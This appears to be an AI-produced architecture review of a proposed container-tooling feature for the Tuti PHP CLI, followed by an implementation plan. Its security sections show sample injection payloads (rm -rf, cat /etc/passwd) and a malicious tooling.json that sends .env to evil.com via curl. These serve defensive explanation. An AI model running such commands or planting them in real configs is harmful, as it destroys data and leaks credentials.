# Architecture Challenge: Custom Tooling Feature for Tuti CLI

**Date:** 2026-03-06
**Challenger:** architecture-challenger
**Proposal:** `.workflow/proposals/tooling-proposal.md` (stored at `~/.claude/plans/enchanted-sparking-fog-agent-ae081d9e5c4d84c82.md`)

---

## Executive Summary

This challenge analyzes the architecture-lead's proposal for implementing custom tooling in Tuti CLI. The proposal recommends **Option A: Catch-All Command with Dynamic Routing** as the preferred approach.

**Verdict: Proposal has significant concerns that must be addressed before implementation**

The catch-all approach, while offering the best user experience, introduces several architectural and security risks that the proposal does not adequately address. The challenge document details these concerns and provides mitigation strategies.

---

## Assumptions Questioned

### Assumption 1: Laravel Zero supports catch-all commands without issues

**Original:** The proposal assumes a catch-all command with signature `'{tool?}'` and `'{args?*}'` will work seamlessly in Laravel Zero.

**Challenge:** Laravel Zero (and Symfony Console) does not have a native "catch-all" command pattern. The proposal's signature `'{tool?}'` would:
- Only capture a single optional argument, not intercept unknown commands
- Require registering this as the `default` command (replacing the current summary)
- NOT actually intercept "unknown" commands - those would still show "Command not found"

**Risk:** High
**Technical Reality:** To achieve the desired UX (`tuti artisan migrate`), you would need to:
1. Register ToolingCommand as the default command (replacing `SummaryCommand::class`)
2. OR implement a custom `Application` class that catches `CommandNotFoundException`
3. OR register every tool as an actual command (defeating the purpose)

**Mitigation:** The proposal needs to specify HOW the catch-all will be implemented. Option C (namespace-based) is actually the only approach that works with Laravel Zero's architecture without custom Application class modifications.

---

### Assumption 2: Reserved command names can be "checked first"

**Original:** "Reserve common command names (list, help, init, etc.)" as a mitigation for command conflicts.

**Challenge:** This is not how command routing works in Laravel Zero. You cannot "check first" - commands are resolved by Symfony Console before any service code runs. The resolution order is:
1. Symfony parses `$_SERVER['argv']`
2. Matches against registered command names
3. If no match, throws `CommandNotFoundException`
4. Only THEN does your command code run

**Risk:** High
**Scenario:**
```
User runs: tuti list
Expected: Shows tooling list OR native command list
Reality: Shows native `list` command (Symfony's built-in)
```

**Mitigation:**
- Explicitly register reserved tool names as commands that delegate to tooling
- OR accept that `tuti list` will never invoke a custom "list" tool
- Document this limitation clearly

---

### Assumption 3: Container is always running when tooling is invoked

**Original:** The proposal shows execution flow assuming containers are available.

**Challenge:** What happens when:
- User runs `tuti artisan migrate` before `tuti local:start`
- The app container exists but is stopped
- The specified service (e.g., "node") doesn't exist in the project's stack

**Risk:** Medium-High
**Current codebase pattern:** `WpSetupCommand.php` checks `areContainersRunning()` before execution. The tooling feature would need similar checks.

**Mitigation:** Required pre-flight checks:
```php
// 1. Is Docker available?
if (!$dockerExecutor->isDockerAvailable()) {
    return Command::FAILURE;
}

// 2. Is the project initialized?
if (!$projectDirectoryService->exists()) {
    return Command::FAILURE;
}

// 3. Are containers running?
$containerName = "{$projectName}_dev_{$serviceName}";
// Check if container exists and is running

// 4. Does the requested service exist?
// Parse docker-compose.yml to verify service definition
```

---

### Assumption 4: Tooling configuration schema is simple enough

**Original:** JSON schema with `service`, `cmd`, `description`, `dir` fields.

**Challenge:** The schema is underspecified for real-world needs:
- How do you handle tools that need environment variable passthrough?
- What about tools that need specific Docker user mapping?
- How do you specify if a tool should use TTY (interactive) or non-TTY mode?
- What about tools that need additional volume mounts?

**Risk:** Medium
**Gap Analysis:**

| Missing Feature | Use Case | Impact |
|-----------------|----------|--------|
| `tty: bool` | `php artisan tinker`, `mysql` | High - interactive commands fail without |
| `env: string[]` | Passing `APP_ENV`, database creds | Medium - some tools need context |
| `user: string` | Running as specific container user | Low - defaults work for most |
| `volumes: object` | Additional mounts beyond project | Medium - some tools need cache dirs |
| `isolated: bool` | Run in temp container vs. existing | Low - nice to have |

**Mitigation:** Expand the schema:
```json
{
  "artisan": {
    "service": "app",
    "cmd": "php artisan",
    "description": "Run Laravel Artisan commands",
    "tty": "auto",
    "env_passthrough": ["APP_ENV", "DB_HOST"]
  }
}
```

---

### Assumption 5: Argument escaping is handled by array syntax

**Original:** Proposal references existing security pattern (array syntax for Process::run()).

**Challenge:** The proposal's execution example shows:
```php
$command = [
    'docker', 'compose',
    '-f', $composeFile,
    '-p', $projectName,
    'exec', '-T',
    $serviceName,
    'sh', '-c',
    $fullCommand  // <-- This is a STRING, not array elements
];
```

This is **unsafe**. The `$fullCommand` is a string like `"php artisan migrate --force"` that gets passed to `sh -c`. If user arguments contain shell metacharacters, they could be exploited.

**Risk:** High (Security)
**Attack Vector:**
```
tuti artisan migrate --path="; rm -rf /var/www/html; #"
```
This would execute:
```bash
sh -c "php artisan migrate --path=; rm -rf /var/www/html; #"
```

**Mitigation:** Two approaches:
1. **Safer:** Use `escapeshellarg()` on each argument before string interpolation (documented exception like `runInteractive()`)
2. **Safest:** Never use `sh -c` - pass arguments directly to container:
```php
$command = [
    'docker', 'compose', 'exec', '-T',
    $serviceName,
    'php', 'artisan', 'migrate', '--path=...',  // each arg as array element
];
```

Option 2 is cleaner but requires parsing the `cmd` string into tokens.

---

### Assumption 6: PHAR/binary build is unaffected

**Original:** Proposal does not mention PHAR build considerations.

**Challenge:** The `tooling.json` file is read from `.tuti/` in the user's project directory. However:
- Stack default tooling should come from `stubs/stacks/{stack}/tooling.json`
- These stubs are bundled in the PHAR at build time
- The code must distinguish between "stub defaults" and "user overrides"

**Risk:** Low-Medium
**Current Pattern:** `StackLoaderService` uses `base_path('stubs/stacks/...')` for stub resolution, which works in PHAR.

**Mitigation:**
1. Load stack defaults from bundled stubs: `base_path('stubs/stacks/laravel/tooling.json')`
2. Load user overrides from project: `$projectPath/.tuti/tooling.json`
3. Merge with user config taking precedence

---

## Weaknesses Identified

### Weakness 1: No service existence validation

**Affects:** Option A, Option B, Option C
**Severity:** Medium

**Description:** The proposal doesn't validate that the target service (e.g., "node") actually exists in the project's Docker Compose configuration.

**Scenario:**
- User is in a Laravel project with only `app` and `database` services
- User runs `tuti npm install`
- Tooling config maps `npm` to `node` service
- `node` service doesn't exist

**Expected Behavior:** Clear error message: "Service 'node' is not defined in this project. Available services: app, database"

**Proposed Behavior:** Would likely fail with Docker error: "No such service: node"

**Gap:** Service validation layer missing from proposal

---

### Weakness 2: No working directory handling

**Affects:** Option A (primary)
**Severity:** Medium

**Description:** The `dir` option in tooling config is insufficient. Some commands need to run in:
- Different directories (e.g., `npm run dev` might need to run in a subdirectory)
- Directories relative to project root
- Directories inside the container that don't correspond to mounted paths

**Current Codebase:** `DockerExecutorService.execInContainer()` doesn't accept a working directory parameter.

**Gap:** Need to add `-w` flag support for `docker compose exec`:
```php
$command = [
    'docker', 'compose', 'exec',
    '-T',
    '-w', $workingDir,  // <-- Missing in current implementation
    $serviceName,
    ...
];
```

---

### Weakness 3: Exit code propagation is unclear

**Affects:** Option A, Option B, Option C
**Severity:** Low-Medium

**Description:** The proposal doesn't specify how exit codes from container commands should propagate back to the host.

**Scenario:**
```
tuti artisan migrate
# Migration fails with exit code 1
# Tuti should exit with code 1
```

**Current Codebase:** `DockerExecutionResultVO` captures exit codes. The `ToolingCommand` must return this properly.

**Mitigation:**
```php
$result = $this->executor->execute($tool, $args);
return $result->exitCode; // Propagate exit code
```

---

## Edge Cases

### Edge Case 1: Tool name conflicts with installed commands

**Scenario:** User defines a tool named `wp` but `WpSetupCommand` exists with signature `wp:setup`

**Expected Behavior:** `tuti wp:setup` runs the command, `tuti wp ...` runs the tool

**Proposed Behavior:** Unclear - catch-all might intercept all `wp` invocations

**Gap:** Need explicit routing priority:
1. Exact command match first (`wp:setup`)
2. Namespace match second
3. Tooling catch-all last

---

### Edge Case 2: Tools with spaces in arguments

**Scenario:** `tuti artisan db:seed --class="Database\\Seeders\\UserSeeder"`

**Expected Behavior:** Argument passed correctly to container

**Proposed Behavior:** String parsing with backslashes and quotes could fail

**Gap:** Need proper argument parsing that respects shell quoting rules.

---

### Edge Case 3: Running tooling outside a project directory

**Scenario:** User runs `tuti artisan migrate` from `~/Downloads/`

**Expected Behavior:** Error: "Not a tuti project. Run from project directory."

**Proposed Behavior:** Proposal doesn't specify this case

**Current Codebase Pattern:** Commands check `ProjectDirectoryService->exists()` first

---

### Edge Case 4: Multiple compose files (base + dev)

**Scenario:** Project has `docker-compose.yml` and `docker-compose.dev.yml`

**Expected Behavior:** Tooling executes with both compose files loaded (service defined in dev)

**Proposed Behavior:** Proposal shows single `-f` flag

**Current Codebase Pattern:** `DockerComposeOrchestrator::buildComposeCommand()` handles multiple files

---

### Edge Case 5: Environment variable inheritance

**Scenario:** User sets `APP_ENV=staging` in host shell, runs `tuti artisan migrate`

**Expected Behavior:** Does `APP_ENV` propagate to container?

**Proposed Behavior:** Not specified

**Gap:** Need explicit `env_passthrough` config or `--env-file` handling

---

## Failure Modes

### Failure Mode 1: Container not running

**Trigger:** User runs `tuti artisan migrate` without `tuti local:start`

**Impact:** Docker error: "Container is not running"

**Recovery:** User must run `tuti local:start`

**Prevention:**
```php
if (!$this->isContainerRunning($serviceName)) {
    $this->failure("Container '{$serviceName}' is not running.");
    $this->hint("Start containers with: tuti local:start");
    return Command::FAILURE;
}
```

---

### Failure Mode 2: Tooling.json is malformed

**Trigger:** User edits `.tuti/tooling.json` with invalid JSON

**Impact:** JSON parsing exception, command crashes

**Recovery:** User must fix JSON manually

**Prevention:**
```php
try {
    $config = json_decode($content, true, 512, JSON_THROW_ON_ERROR);
} catch (JsonException $e) {
    $this->failure("Invalid tooling.json: " . $e->getMessage());
    $this->hint("Validate JSON at: .tuti/tooling.json");
    return Command::FAILURE;
}
```

---

### Failure Mode 3: Docker daemon not running

**Trigger:** Docker Desktop not started

**Impact:** `isDockerAvailable()` returns false

**Recovery:** User starts Docker

**Prevention:** Check at command start:
```php
if (!$this->dockerExecutor->isDockerAvailable()) {
    $this->failure("Docker is not available. Please start Docker.");
    return Command::FAILURE;
}
```

---

### Failure Mode 4: Service not defined in compose

**Trigger:** Tooling config references `node` service, but project doesn't have one

**Impact:** Docker error: "No such service: node"

**Recovery:** User removes/updates tooling config

**Prevention:**
```php
$services = $this->getDefinedServices($composePath);
if (!in_array($serviceName, $services)) {
    $this->failure("Service '{$serviceName}' not found in project.");
    $this->hint("Available services: " . implode(', ', $services));
    return Command::FAILURE;
}
```

---

### Failure Mode 5: Interactive mode with piped input

**Trigger:** `echo "migrate" | tuti artisan` when TTY detection says interactive

**Impact:** Command hangs waiting for input

**Recovery:** Ctrl+C

**Prevention:** Better TTY detection:
```php
$isInteractive = function_exists('posix_isatty')
    && posix_isatty(STDIN)
    && posix_isatty(STDOUT);
```

---

## Security Concerns

### Concern 1: Shell command injection via arguments

**Vulnerability:** Passing user arguments through `sh -c` without escaping

**Attack Vector:**
```bash
tuti artisan migrate --path='$(malicious_command)'
tuti npm run '; cat /etc/passwd #'
```

**Mitigation:**
1. Use `escapeshellarg()` on each argument
2. Or avoid `sh -c` entirely - pass arguments as array elements
3. Validate argument format for known tools

---

### Concern 2: Tooling config tampering

**Vulnerability:** Malicious `.tuti/tooling.json` in a cloned repository

**Attack Vector:**
```json
{
  "tools": {
    "artisan": {
      "service": "app",
      "cmd": "curl http://evil.com?data=$(cat .env)"
    }
  }
}
```

**Mitigation:**
1. Validate `cmd` against allowlist of known commands
2. Warn if tooling.json was modified recently
3. Add `tooling.json` integrity check (hash)

---

### Concern 3: Arbitrary container access

**Vulnerability:** Tooling config could reference any service, potentially escalating privileges

**Attack Vector:** Define tool that runs in privileged container

**Mitigation:**
1. Only allow services defined in project's compose file
2. Block access to infrastructure containers (traefik, etc.)

---

## Suggestions

### Improvement 1: Implement proper catch-all via custom Application

**For:** Option A
**Suggestion:** Instead of relying on command signatures, create a custom `TutiApplication` class that catches `CommandNotFoundException` and delegates to tooling.

```php
class TutiApplication extends Application
{
    protected function doRunCommand(Command $command, InputInterface $input, OutputInterface $output): int
    {
        try {
            return parent::doRunCommand($command, $input, $output);
        } catch (CommandNotFoundException $e) {
            // Try tooling
            $toolName = $input->getFirstArgument();
            if ($this->toolingService->hasTool($toolName)) {
                return $this->runTooling($toolName, $input, $output);
            }
            throw $e;
        }
    }
}
```

**Tradeoff:** More complex, but achieves true catch-all behavior

---

### Improvement 2: Add TTY auto-detection with override

**For:** All options
**Suggestion:** Auto-detect TTY requirement based on command type, allow override.

```json
{
  "artisan": {
    "tty": "auto"  // auto-detect: tinker = on, migrate = off
  },
  "mysql": {
    "tty": true    // always interactive
  },
  "composer": {
    "tty": false   // never needs TTY
  }
}
```

---

### Improvement 3: Merge stack defaults with user config

**For:** All options
**Suggestion:** Provide sensible defaults per stack, let users override.

```
# Resolution order:
1. stubs/stacks/laravel/tooling.json (bundled in PHAR)
2. .tuti/tooling.json (user overrides)
3. Merge: user config takes precedence
```

---

### Improvement 4: Add tooling validation command

**For:** All options
**Suggestion:** `tuti tooling:validate` command to check config and service availability.

```bash
tuti tooling:validate
# Checks:
# - tooling.json syntax
# - All referenced services exist
# - All containers are running
# - Environment variables are set
```

---

### Improvement 5: Consider Option C as MVP, A as v2

**For:** Project timeline
**Suggestion:** Start with Option C (namespace-based) for faster delivery with no catch-all complexity, then add Option A in a subsequent release.

**Rationale:**
- Option C works with existing Laravel Zero patterns
- Lower risk, faster time to market
- User feedback can inform Option A implementation
- Migration from C to A is straightforward (just update aliases)

---

## Conclusion

**Verdict: Proposal has significant concerns**

- [ ] Proposal is sound as-is
- [ ] Proposal needs minor adjustments
- [x] **Proposal has significant concerns**
- [ ] Proposal should be rejected

**Reasoning:**

The recommended **Option A (Catch-All Command)** has three critical issues:

1. **Technical Feasibility:** Laravel Zero does not natively support catch-all commands. The proposal's signature approach (`'{tool?}'`) would NOT intercept unknown commands. Implementing true catch-all requires custom Application class modification.

2. **Security Vulnerability:** The execution flow passes user arguments through `sh -c` as a string, creating shell injection risk. This violates the project's security standards.

3. **Missing Pre-flight Validation:** No checks for:
   - Container running state
   - Service existence in compose file
   - Project directory validity

**Recommended Path Forward:**

1. **Short-term:** Implement **Option C (Namespace-Based)** as MVP
   - Works with existing architecture
   - Lower risk, faster delivery
   - `tuti tool:artisan migrate` is acceptable UX

2. **Medium-term:** Address catch-all architecture properly
   - Custom Application class with CommandNotFoundException handling
   - Or explore Laravel Zero plugins for catch-all support

3. **Security Fixes Required (for any option):**
   - Implement argument escaping or array-based execution
   - Add container running state validation
   - Add service existence validation
   - Validate tooling.json schema

4. **Schema Enhancements:**
   - Add `tty` field (auto/true/false)
   - Add `env_passthrough` field
   - Consider `isolated` field for temp containers

The proposal's UX goals are excellent, but the implementation details need significant refinement before proceeding.



***Implementation Plan: Custom Tooling Feature for Tuti CLI***                                                                                                        │
│                                                                                                                                                                 │
│ Context                                                                                                                                                         │
│                                                                                                                                                                 │
│ Problem: Users want to run commands through Tuti CLI that execute inside Docker containers, similar to Lando's tooling feature.                                 │
│                                                                                                                                                                 │
│ Goal: Enable commands like tuti artisan migrate, tuti npm run dev, tuti composer update, tuti wp get posts - where Tuti routes these to the correct container.  │
│                                                                                                                                                                 │
│ Decision: Option A: Catch-All Command with stack defaults auto-discovered from stubs.                                                                           │
│                                                                                                                                                                 │
│ ---                                                                                                                                                             │
│ User Experience                                                                                                                                                 │
│                                                                                                                                                                 │
│ tuti artisan migrate        # → docker compose exec app php artisan migrate                                                                                     │
│ tuti npm run dev            # → docker compose exec node npm run dev                                                                                            │
│ tuti composer install       # → docker compose exec app composer install                                                                                        │
│ tuti wp post list           # → docker compose exec app wp post list                                                                                            │
│ tuti mycustomcmd --flag     # → custom tool from .tuti/tooling.json                                                                                             │
│                                                                                                                                                                 │
│ ---                                                                                                                                                             │
│ Architecture                                                                                                                                                    │
│                                                                                                                                                                 │
│ Custom Application Class                                                                                                                                        │
│                                                                                                                                                                 │
│ Laravel Zero doesn't natively support catch-all commands. We'll create a custom TutiApplication that catches CommandNotFoundException and delegates to tooling: │
│                                                                                                                                                                 │
│ // app/Application/TutiApplication.php                                                                                                                          │
│ final class TutiApplication extends Application                                                                                                                 │
│ {                                                                                                                                                               │
│     protected function doRunCommand(Command $command, InputInterface $input, OutputInterface $output): int                                                      │
│     {                                                                                                                                                           │
│         try {                                                                                                                                                   │
│             return parent::doRunCommand($command, $input, $output);                                                                                             │
│         } catch (CommandNotFoundException $e) {                                                                                                                 │
│             $toolName = $input->getFirstArgument();                                                                                                             │
│             if ($this->toolingService->hasTool($toolName)) {                                                                                                    │
│                 return $this->runTooling($toolName, $input, $output);                                                                                           │
│             }                                                                                                                                                   │
│             throw $e;                                                                                                                                           │
│         }                                                                                                                                                       │
│     }                                                                                                                                                           │
│ }                                                                                                                                                               │
│                                                                                                                                                                 │
│ Configuration Resolution                                                                                                                                        │
│                                                                                                                                                                 │
│ 1. Load stack defaults from stubs/stacks/{stack}/tooling.json (bundled in PHAR)                                                                                 │
│ 2. Load user overrides from .tuti/tooling.json                                                                                                                  │
│ 3. Merge with user config taking precedence                                                                                                                     │
│                                                                                                                                                                 │
│ Security (Critical)                                                                                                                                             │
│                                                                                                                                                                 │
│ // SAFE: Array-based execution (no shell interpolation)                                                                                                         │
│ $command = [                                                                                                                                                    │
│     'docker', 'compose', 'exec',                                                                                                                                │
│     '-T',                                                                                                                                                       │
│     '-w', $workingDir,                                                                                                                                          │
│     $serviceName,                                                                                                                                               │
│     ...$cmdParts,  // ['php', 'artisan']                                                                                                                        │
│     ...$userArgs   // ['migrate', '--force']                                                                                                                    │
│ ];                                                                                                                                                              │
│ Process::run($command);  // Laravel escapes each array element                                                                                                  │
│                                                                                                                                                                 │
│ Pre-flight Validation                                                                                                                                           │
│                                                                                                                                                                 │
│ // 1. Docker available                                                                                                                                          │
│ if (!$this->dockerExecutor->isDockerAvailable()) { /* error */ }                                                                                                │
│                                                                                                                                                                 │
│ // 2. Project initialized                                                                                                                                       │
│ if (!$this->projectDirectoryService->exists()) { /* error */ }                                                                                                  │
│                                                                                                                                                                 │
│ // 3. Container running                                                                                                                                         │
│ if (!$this->isContainerRunning($serviceName)) { /* error */ }                                                                                                   │
│                                                                                                                                                                 │
│ // 4. Service exists in compose                                                                                                                                 │
│ if (!$this->serviceExists($serviceName)) { /* error */ }                                                                                                        │
│                                                                                                                                                                 │
│ ---                                                                                                                                                             │
│ Configuration Schema                                                                                                                                            │
│                                                                                                                                                                 │
│ Tool Definition (.tuti/tooling.json)                                                                                                                            │
│                                                                                                                                                                 │
│ {                                                                                                                                                               │
│   "tools": {                                                                                                                                                    │
│     "artisan": {                                                                                                                                                │
│       "service": "app",                                                                                                                                         │
│       "cmd": ["php", "artisan"],                                                                                                                                │
│       "description": "Run Laravel Artisan commands",                                                                                                            │
│       "tty": "auto",                                                                                                                                            │
│       "dir": "/var/www/html"                                                                                                                                    │
│     },                                                                                                                                                          │
│     "npm": {                                                                                                                                                    │
│       "service": "node",                                                                                                                                        │
│       "cmd": ["npm"],                                                                                                                                           │
│       "description": "Run npm commands",                                                                                                                        │
│       "tty": false                                                                                                                                              │
│     },                                                                                                                                                          │
│     "composer": {                                                                                                                                               │
│       "service": "app",                                                                                                                                         │
│       "cmd": ["composer"],                                                                                                                                      │
│       "description": "Run Composer commands"                                                                                                                    │
│     },                                                                                                                                                          │
│     "wp": {                                                                                                                                                     │
│       "service": "app",                                                                                                                                         │
│       "cmd": ["wp"],                                                                                                                                            │
│       "description": "Run WP-CLI commands",                                                                                                                     │
│       "dir": "/var/www/html"                                                                                                                                    │
│     }                                                                                                                                                           │
│   },                                                                                                                                                            │
│   "defaults": {                                                                                                                                                 │
│     "service": "app",                                                                                                                                           │
│     "tty": "auto",                                                                                                                                              │
│     "dir": "/var/www/html"                                                                                                                                      │
│   }                                                                                                                                                             │
│ }                                                                                                                                                               │
│                                                                                                                                                                 │
│ Schema Fields                                                                                                                                                   │
│                                                                                                                                                                 │
│ ┌─────────────────┬─────────────┬──────────┬──────────────────────────────────────────┐                                                                         │
│ │      Field      │    Type     │ Required │               Description                │                                                                         │
│ ├─────────────────┼─────────────┼──────────┼──────────────────────────────────────────┤                                                                         │
│ │ service         │ string      │ Yes      │ Container service name (app, node, etc.) │                                                                         │
│ ├─────────────────┼─────────────┼──────────┼──────────────────────────────────────────┤                                                                         │
│ │ cmd             │ string[]    │ Yes      │ Command parts as array                   │                                                                         │
│ ├─────────────────┼─────────────┼──────────┼──────────────────────────────────────────┤                                                                         │
│ │ description     │ string      │ No       │ Help text for tuti tooling:list          │                                                                         │
│ ├─────────────────┼─────────────┼──────────┼──────────────────────────────────────────┤                                                                         │
│ │ tty             │ bool/"auto" │ No       │ Interactive mode (default: "auto")       │                                                                         │
│ ├─────────────────┼─────────────┼──────────┼──────────────────────────────────────────┤                                                                         │
│ │ dir             │ string      │ No       │ Working directory in container           │                                                                         │
│ ├─────────────────┼─────────────┼──────────┼──────────────────────────────────────────┤                                                                         │
│ │ env_passthrough │ string[]    │ No       │ Host env vars to pass to container       │                                                                         │
│ └─────────────────┴─────────────┴──────────┴──────────────────────────────────────────┘                                                                         │
│                                                                                                                                                                 │
│ ---                                                                                                                                                             │
│ Files to Create                                                                                                                                                 │
│                                                                                                                                                                 │
│ app/                                                                                                                                                            │
│ ├── Application/                                                                                                                                                │
│ │   └── TutiApplication.php         # Custom Application with catch-all                                                                                         │
│ ├── Commands/Tooling/                                                                                                                                           │
│ │   ├── ToolingListCommand.php      # tooling:list - show available tools                                                                                       │
│ │   └── ToolingValidateCommand.php  # tooling:validate - check config                                                                                           │
│ ├── Services/Tooling/                                                                                                                                           │
│ │   ├── ToolingConfigService.php    # Load/merge tooling.json                                                                                                   │
│ │   └── ToolingExecutorService.php  # Execute tools in containers                                                                                               │
│ ├── Domain/Tooling/                                                                                                                                             │
│ │   └── ToolingDefinitionVO.php     # Tool config value object                                                                                                  │
│                                                                                                                                                                 │
│ stubs/stacks/                                                                                                                                                   │
│ ├── laravel/tooling.json            # Laravel default tools                                                                                                     │
│ └── wordpress/tooling.json          # WordPress default tools                                                                                                   │
│                                                                                                                                                                 │
│ bootstrap/                                                                                                                                                      │
│ └── app.php                         # Update to use TutiApplication                                                                                             │
│                                                                                                                                                                 │
│ ---                                                                                                                                                             │
│ Implementation Steps                                                                                                                                            │
│                                                                                                                                                                 │
│ Step 1: Domain Layer                                                                                                                                            │
│                                                                                                                                                                 │
│ - Create ToolingDefinitionVO value object                                                                                                                       │
│ - Define schema validation rules                                                                                                                                │
│                                                                                                                                                                 │
│ Step 2: Configuration Service                                                                                                                                   │
│                                                                                                                                                                 │
│ - Create ToolingConfigService to load/merge configs                                                                                                             │
│ - Load from stack stubs (PHAR-compatible via base_path())                                                                                                       │
│ - Merge with user .tuti/tooling.json                                                                                                                            │
│ - JSON schema validation                                                                                                                                        │
│                                                                                                                                                                 │
│ Step 3: Execution Service                                                                                                                                       │
│                                                                                                                                                                 │
│ - Create ToolingExecutorService                                                                                                                                 │
│ - Pre-flight validation (Docker, container, service)                                                                                                            │
│ - TTY detection (auto/true/false)                                                                                                                               │
│ - Array-based command execution (security)                                                                                                                      │
│ - Exit code propagation                                                                                                                                         │
│                                                                                                                                                                 │
│ Step 4: Custom Application                                                                                                                                      │
│                                                                                                                                                                 │
│ - Create TutiApplication extending Application                                                                                                                  │
│ - Catch CommandNotFoundException                                                                                                                                │
│ - Delegate to ToolingExecutorService                                                                                                                            │
│ - Update bootstrap/app.php                                                                                                                                      │
│                                                                                                                                                                 │
│ Step 5: Helper Commands                                                                                                                                         │
│                                                                                                                                                                 │
│ - Create ToolingListCommand (tuti tooling:list)                                                                                                                 │
│ - Create ToolingValidateCommand (tuti tooling:validate)                                                                                                         │
│                                                                                                                                                                 │
│ Step 6: Stack Defaults                                                                                                                                          │
│                                                                                                                                                                 │
│ - Create stubs/stacks/laravel/tooling.json                                                                                                                      │
│ - Create stubs/stacks/wordpress/tooling.json                                                                                                                    │
│                                                                                                                                                                 │
│ Step 7: Tests                                                                                                                                                   │
│                                                                                                                                                                 │
│ - Unit tests: ToolingConfigService, ToolingExecutorService                                                                                                      │
│ - Feature tests: ToolingCommand execution                                                                                                                       │
│ - Test edge cases: invalid tool, container stopped, etc.                                                                                                        │
│                                                                                                                                                                 │
│ ---                                                                                                                                                             │
│ Stack Default Tools                                                                                                                                             │
│                                                                                                                                                                 │
│ Laravel (stubs/stacks/laravel/tooling.json)                                                                                                                     │
│                                                                                                                                                                 │
│ {                                                                                                                                                               │
│   "tools": {                                                                                                                                                    │
│     "artisan": {"service": "app", "cmd": ["php", "artisan"]},                                                                                                   │
│     "composer": {"service": "app", "cmd": ["composer"]},                                                                                                        │
│     "php": {"service": "app", "cmd": ["php"]},                                                                                                                  │
│     "npm": {"service": "node", "cmd": ["npm"]},                                                                                                                 │
│     "node": {"service": "node", "cmd": ["node"]}                                                                                                                │
│   }                                                                                                                                                             │
│ }                                                                                                                                                               │
│                                                                                                                                                                 │
│ WordPress (stubs/stacks/wordpress/tooling.json)                                                                                                                 │
│                                                                                                                                                                 │
│ {                                                                                                                                                               │
│   "tools": {                                                                                                                                                    │
│     "wp": {"service": "app", "cmd": ["wp"], "dir": "/var/www/html"},                                                                                            │
│     "composer": {"service": "app", "cmd": ["composer"]},                                                                                                        │
│     "php": {"service": "app", "cmd": ["php"]},                                                                                                                  │
│     "npm": {"service": "node", "cmd": ["npm"]}                                                                                                                  │
│   }                                                                                                                                                             │
│ }                                                                                                                                                               │
│                                                                                                                                                                 │
│ ---                                                                                                                                                             │
│ Verification                                                                                                                                                    │
│                                                                                                                                                                 │
│ Unit Tests                                                                                                                                                      │
│                                                                                                                                                                 │
│ docker compose exec -T app composer test:unit -- --filter Tooling                                                                                               │
│                                                                                                                                                                 │
│ Manual Testing                                                                                                                                                  │
│                                                                                                                                                                 │
│ # From a Laravel project directory                                                                                                                              │
│ tuti artisan migrate                                                                                                                                            │
│ tuti artisan --help                                                                                                                                             │
│ tuti npm install                                                                                                                                                │
│ tuti composer update                                                                                                                                            │
│                                                                                                                                                                 │
│ # List available tools                                                                                                                                          │
│ tuti tooling:list                                                                                                                                               │
│                                                                                                                                                                 │
│ # Validate configuration                                                                                                                                        │
│ tuti tooling:validate                                                                                                                                           │
│                                                                                                                                                                 │
│ # Error cases                                                                                                                                                   │
│ tuti nonexistentcmd    # Should show "Tool 'nonexistentcmd' not found"                                                                                          │
│ cd /tmp && tuti artisan migrate  # Should show "Not a tuti project"                                                                                             │
│                                                                                                                                                                 │
│ Edge Cases to Test                                                                                                                                              │
│                                                                                                                                                                 │
│ - Tool name conflicts with existing command (should run existing command)                                                                                       │
│ - Container not running (clear error message)                                                                                                                   │
│ - Service not in compose file (list available services)                                                                                                         │
│ - Malformed tooling.json (validation error)                                                                                                                     │
│ - Interactive commands (artisan tinker, mysql) - TTY passthrough                                                                                                │
│                                                                                                                                                                 │
│ ---                                                                                                                                                             │
│ Reserved Commands (Won't be caught as tools)                                                                                                                    │
│                                                                                                                                                                 │
│ - list, help, init, start, stop, restart, status                                                                                                                │
│ - stack:*, local:*, infra:*, tooling:*                                                                                                                          │
│ - All currently registered commands                                
